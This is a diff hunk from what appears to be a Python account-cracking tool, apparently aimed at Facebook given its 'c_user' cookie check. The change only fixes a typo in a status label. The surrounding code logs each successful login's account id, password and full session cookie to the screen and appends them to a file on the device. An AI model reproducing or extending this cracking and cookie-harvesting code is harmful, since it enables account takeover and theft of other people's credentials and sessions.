@@ -650,7 +650,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki.split('c_user=')[1].split(';')[0]
-                print('\r\r\33[1;32m [LIVEE-OK] ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                print('\r\r\33[1;32m [LIVE-OK] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                 print(f' [★] Cookie : {coki}')
                 cek_apk(session,coki)
                 open('/sdcard/LIVEE-OK.txt', 'a').write( cid+'|'+ps+'|'+coki+'\n')
